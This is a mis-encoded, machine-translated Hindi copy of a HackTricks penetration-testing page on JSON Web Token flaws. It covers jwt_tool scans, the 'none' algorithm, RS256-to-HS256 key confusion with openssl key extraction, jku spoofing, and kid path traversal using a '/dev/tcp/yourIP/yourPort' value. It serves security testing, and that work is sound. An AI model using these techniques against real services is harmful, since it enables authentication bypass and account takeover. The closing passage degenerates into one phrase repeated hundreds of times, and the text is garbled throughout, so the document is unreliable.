# JWT рджреБрд░реНрдмрд▓рддрд╛рдПрдВ (Json Web Tokens)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓** рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [**hacktricks repo**](https://github.com/carlospolop/hacktricks) рдФрд░ [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдпреБрдХреНрддрд┐**: **Intigriti** рдореЗрдВ **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдИ рдЧрдИ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╛рд░реЗ рд╕рд╛рде рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks), рдФрд░ **$100,000** рддрдХ рдХреА рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдПрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWTs рдХреЛ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдорд╣рд╛рди рдЙрдкрдХрд░рдг рдХреЗ рд▓реЗрдЦрдХ** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **рддреНрд╡рд░рд┐рдд рдЬреАрдд**

рдореЛрдб `All Tests!` рдХреЗ рд╕рд╛рде [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) рдХреЛ рдЪрд▓рд╛рдПрдВ рдФрд░ рд╣рд░реЗ рд░реЗрдЦрд╛рдУрдВ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВ
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
рдпрджрд┐ рдЖрдкрдХреЛ рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЯреВрд▓ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдЬреЗрдбрдмреНрд▓реНрдпреВрдЯреА рдХреА рдЧрд▓рддреА рдХреА рдХреБрдЫ рдорд╛рдорд▓реЗ рдвреВрдВрдврд╝ рд▓реЗрдЧрд╛:

![](<../.gitbook/assets/image (435).png>)

рдлрд┐рд░, рдЖрдк рдкреНрд░реЙрдХреНрд╕реА рдореЗрдВ рдЕрдкрдиреА рдЕрдиреБрд░реЛрдз рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЬреЗрдбрдмреНрд▓реНрдпреВрдЯреА рдХреЛ рдЬреНрд╡реЗрдЯреА_рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### рдбреЗрдЯрд╛ рдореЗрдВ рдХреЛрдИ рдмрджрд▓рд╛рд╡ рдХрд┐рдП рдмрд┐рдирд╛ рддрдВрдЧ рдХрд░реЗрдВ

рдЖрдк рд╕рд┐рд░реНрдл рдбреЗрдЯрд╛ рдореЗрдВ рддрдВрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреЛ рдЕрдкреВрд░реНрдг рдЫреЛрдбрд╝рдХрд░ рдФрд░ рджреЗрдЦреЗрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ "рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ" рдореЗрдВ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

#### **рдХреНрдпрд╛ рдЯреЛрдХрди рдЬрд╛рдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ?**

* рдпрджрд┐ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рд╣реЛрддрд╛ рд╣реИ рддреЛ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ - рдХреЛрдИ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЫрд┐рдкреА рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЗрд╕реЗ рдкрдврд╝реЗрдВред
* рдпрджрд┐ рдкреГрд╖реНрда рд╡рд╛рдкрд╕ рдЖрддрд╛ рд╣реИ рддреЛ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИред
* рдпрджрд┐ рдкреГрд╖реНрда рд╕рдорд╛рди рд╣реИ рддреЛ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ - рдЕрдм Payload рдХреНрд▓реЗрдо рдХреЛ рддрдВрдЧ рдХрд░рдиреЗ рдХреА рд╢реБрд░реБрдЖрдд рдХрд░рдиреЗ рдХрд╛ рд╕рдордп рд╣реИ, рджреЗрдЦреЗрдВ рдХрд┐ рдЖрдк рдХреНрдпрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ!

### рдореВрд▓

рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдЕрдиреБрд░реЛрдз рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рджреЗрдЦреЗрдВ рдХрд┐ рдЯреЛрдХрди рдХрд╣рд╛рдВ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╣реБрдЖ рд╣реИред рдпрд╣ рд╕рд░реНрд╡рд░ рдкрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рдирд╣реАрдВред

* рдпрджрд┐ рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд╕реЗ рдЖрдпрд╛ рд╣реИ рддреЛ **рдХреБрдВрдЬреА** рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреЛрдб рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реИ - рдЗрд╕реЗ рдЦреЛрдЬреЗрдВ!
* рдпрджрд┐ рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ рд╕рд░реНрд╡рд░ рд╕реЗ рдЖрдпрд╛ рд╣реИ рддреЛ рд╕рдм рдареАрдХ рд╣реИред

### рдЕрд╡рдзрд┐

рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЯреЛрдХрди 24 рдШрдВрдЯреЗ рд╕реЗ рдЕрдзрд┐рдХ рдЪрд▓рддрд╛ рд╣реИ... рд╢рд╛рдпрдж рдпрд╣ рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдпрджрд┐ "exp" рдлрд╝реАрд▓реНрдб рд╣реИ, рддреЛ рджреЗрдЦреЗрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреИрд╕реЗ рд╣реИрдВрдбрд▓ рдХрд░ рд░рд╣рд╛ рд╣реИред

### HMAC рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░реЗрдВ

[**рдЗрд╕ рдкреЗрдЬ рдХреЛ рджреЗрдЦреЗрдВред**](../generic-methodologies-and-resources/brute-force.md#jwt)

### рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ рдирди (CVE-2015-9235) рдореЗрдВ рдмрджрд▓реЗрдВ

рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ "рдирди" рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рднрд╛рдЧ рдХреЛ рд╣рдЯрд╛ рджреЗрдВред

рдЗрд╕ рддрдВрддреНрд░ рдХреЛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдФрд░ JWT рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рдорд╛рдиреЛрдВ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП "JSON Web Token" рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдЕрдиреБрд░реЛрдз рдХреЛ рд░рд┐рдкреАрдЯрд░ рдХреЛ рднреЗрдЬреЗрдВ рдФрд░ "JSON Web Token" рдЯреИрдм рдореЗрдВ рдЯреЛрдХрди рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣ рднреА рдЪреБрди рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ "Alg" рдлрд╝реАрд▓реНрдб рдХреЗ рдорд╛рди рдХреЛ "рдирди" рдореЗрдВ рд░рдЦреЗрдВ)ред

### рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ RS256 (рдЕрд╕рдорд╛рди) рд╕реЗ HS256 (рд╕рдорд╛рдирд╛рдВрддрд░) рдореЗрдВ рдмрджрд▓реЗрдВ (CVE-2016-5431/CVE-2016-10555)

рдПрд▓реНрдЧреЛрд░рд┐рджрдо HS256 рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдФрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред
рдПрд▓реНрдЧреЛрд░рд┐рджрдо RS256 рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ RS256 рд╕реЗ HS256 рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ рдмреИрдХ рдПрдВрдб рдХреЛрдб рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ HS256 рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рддрд╛ рд╣реИред

рдлрд┐рд░, рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ RS256 рдХреЛ HS256 рдореЗрдВ рдмрджрд▓рдХрд░ рд╣рдо рдПрдХ рдорд╛рдиреНрдп рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЗрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### рд╣реЗрдбрд░ рдореЗрдВ рдирдпрд╛ рдкрдмреНрд▓рд┐рдХ рдХреА

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЯреЛрдХрди рдХреЗ рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ рдирдпрд╛ рдХреА рдПрдореНрдмреЗрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдЗрд╕ рдирдП рдХреА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕рд┐рдЧреНрдиреЗрдЪрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ (CVE-2018-0114).

рдЗрд╕реЗ "JSON Web Tokens" рдмрд░реНрдк рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
(рдЕрдиреБрд░реЛрдз рдХреЛ рд░рд┐рдкреАрдЯрд░ рдХреЛ рднреЗрдЬреЗрдВ, JSON Web Token рдЯреИрдм рдореЗрдВ "CVE-2018-0114" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ)ред

### JWKS рд╕реНрдкреВрдлрд┐рдВрдЧ

рдпрджрд┐ рдЯреЛрдХрди рдореЗрдВ "jku" рд╣реЗрдбрд░ рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ URL рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдпрд╣ рдЯреЛрдХрди рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓реА JWKS рдлрд╝рд╛рдЗрд▓ рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓реА URL рдкрд░ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдПред рдЯреЛрдХрди рдХреЛ рддрдереНрдп рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП jku рдорд╛рди рдХреЛ рд╡реЗрдм рд╕реЗрд╡рд╛ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрдереНрдп рдХреЛ рдмрджрд▓реЗрдВред

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ HTTP рдЗрдВрдЯрд░реИрдХреНрд╢рди рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рдЕрдм рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рдЖрдкрдХреА рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ URL рд╕реЗ рдХреБрдВрдЬреА рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИред _jwt\_tool рдХреЗ -S рдлрд╝реНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ -u_ [_http://example.com_](http://example.com) _рд╡рд┐рдзрд┐рдореЗрдВ рдПрдХ рдирдИ рдХреБрдВрдЬреА рдЬреЛрдбрд╝рдиреЗ, рдЖрдкрдХреА рдкреНрд░рджрд╛рди рдХреА рдЧрдИ URL рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ, рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд░рдЦрдиреЗ рд╡рд╛рд▓реА JWKS рдмрдирд╛рдиреЗ рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдЯреЛрдХрди рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред_

### Kid рд╕рдорд╕реНрдпрд╛рдПрдВ

`kid` рдПрдХ рдРрдЪреНрдЫрд┐рдХ рд╣реЗрдбрд░ рдХреНрд▓реЗрдо рд╣реИ рдЬреЛ рдПрдХ рдХреБрдВрдЬреА рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдХреЛ рд░рдЦрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдЯреЛрдХрди рдХреЛ рд╕рд╛рдЗрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдХреБрдВрдЬреА рд╣реЛрддреА рд╣реИ рдФрд░ рдЖрдкрдХреЛ рд╕рддреНрдпрд╛рдкрди рдХреЗ рд▓рд┐рдП рд╕рд╣реА рдХреБрдВрдЬреА рдХреА рдЦреЛрдЬ рдХрд░рдиреА рд╣реЛрддреА рд╣реИред

#### "kid" рд╕рдорд╕реНрдпрд╛рдПрдВ - рдХреБрдВрдЬреА рдЙрдЬрд╛рдЧрд░ рдХрд░реЗрдВ

рдпрджрд┐ рд╣реЗрдбрд░ рдореЗрдВ "kid" рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рдпрд╛ рдЙрд╕рдХрд╛ рдПрдХ рд░реВрдкрд╛рдВрддрд░рдг рдвреВрдВрдвреЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдпрджрд┐ `"kid":"key/12345"` рд╣реИ рддреЛ _/key/12345_ рдФрд░ _/key/12345.pem_ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рд╡реЗрдм рд░реВрдЯ рдкрд░ред

#### "kid" рд╕рдорд╕реНрдпрд╛рдПрдВ - рдкрде рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓

рдпрджрд┐ рд╣реЗрдбрд░ рдореЗрдВ "kid" рдХреНрд▓реЗрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЪреБрдиреЗрдВ рдЬрд┐рд╕рдХреЗ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рд╢рд╛рдпрдж рдкрд░реАрдХреНрд╖рдг рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рдХреЗ рд▓рд┐рдП `"kid":"/dev/tcp/yourIP/yourPort"` рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ, рдпрд╛ рдлрд┐рд░ рдХреБрдЫ **SSRF** рдкреЗрд▓реЛрдб...\
_JWT рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп рдХреЛ рддрдереНрдп 